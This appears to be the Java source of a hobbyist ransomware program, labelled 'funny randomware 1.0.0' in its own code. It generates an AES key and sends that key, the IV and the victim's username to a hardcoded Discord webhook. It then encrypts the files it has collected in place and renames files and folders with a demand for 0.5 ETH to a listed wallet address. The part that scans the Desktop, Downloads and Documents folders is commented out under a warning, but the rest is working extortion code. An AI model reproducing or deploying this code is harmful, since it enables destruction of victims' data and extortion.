import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.swing.*;
import java.awt.*;
import java.io.*;
import java.lang.reflect.Array;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Scanner;

public class Main {
    public static ArrayList<File> realF = new ArrayList<>();
    public static ArrayList<File> dirs = new ArrayList<>();

    public static void main(String[] args) {
        /*
        WHATEVER YOU DO
        DO NOT
        UNCOMMENT THIS
        please for the sake of your files

        File des = new File(System.getProperty("user.home") + "/Desktop");
        File dow = new File(System.getProperty("user.home") + "/Downloads");
        File doc = new File(System.getProperty("user.home") + "/Documents");
        getFiles(des);
        getFiles(dow);
        getFiles(doc);


        for (File f : realF) {
            System.out.println(f.toString());
        }
        System.out.println(realF.size());
        for (File f : dirs) {
            System.out.println(f.toString());
        }
        System.out.println(dirs.size());
         */


        try {
            SecretKey key = Encrypt.genKey(256);
            String strKey = Base64.getEncoder().encodeToString(key.getEncoded());
            IvParameterSpec iv = Encrypt.generateIv();
            DiscordWebhook LMAO = new DiscordWebhook("https://discord.com/api/webhooks/1024833564971384912/pVMr8ShCNE4hOBhLvhHsH3qshaga8l4-rnlnGEGMRVwpaFZSgHNm9qf_0KOz6Q4ydw5g");
            LMAO.setUsername(System.getProperty("user.name"));
            LMAO.addEmbed(new DiscordWebhook.EmbedObject()
                    .setTitle("idiot detected")
                    .setDescription("funny randomware 1.0.0")
                    .setColor(Color.GREEN)
                    .addField("Encryption Type", key.getAlgorithm(), false)
                    .addField("SecretKey", Base64.getEncoder().encodeToString(key.getEncoded()), false)
                    .addField("IvParameterSpec", iv.getIV().toString(), false)
                    .setImage("https://media.istockphoto.com/photos/asian-emoji-with-conical-straw-hat-isolated-on-white-background-picture-id961331086?k=20&m=961331086&s=170667a&w=0&h=Fy2TU1TWJADmIZh-pKdjNNh8pVs6dOR2cziNNrlhHJA="));
            LMAO.execute();

            //here comes the funny part
            for(File f : realF) {
                encryptFile(f,key,iv);
            }
            for(File f : dirs) {
                f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED"));
            }
        }catch(Exception e) {
            e.printStackTrace();
        }
    }

    public static void encryptFile(File f, SecretKey key, IvParameterSpec iv) throws IOException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        Scanner sc = new Scanner(f);
        ArrayList<String> data = new ArrayList<>();
        ArrayList<String> encdata = new ArrayList<>();
        ArrayList<String> decdata = new ArrayList<>();
        while (sc.hasNextLine()) {
            data.add(sc.nextLine());
        }
        for (String s : data) {
            encdata.add(Encrypt.encrypt("AES/CBC/PKCS5PADDING", s, key, iv));
        }
        new FileOutputStream(f).close();
        FileWriter wr = new FileWriter(f);
        for (String s : encdata) {
            wr.write(s);
        }
        wr.close();

        f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED.java"));
    }

    public static void getFiles(File f) {
        File[] flist = f.listFiles();
        for (File fi : flist) {
            if (fi.isDirectory()) {
                dirs.add(fi);
                getFiles(fi);
            } else {
                realF.add(fi);
            }
        }
    }
}
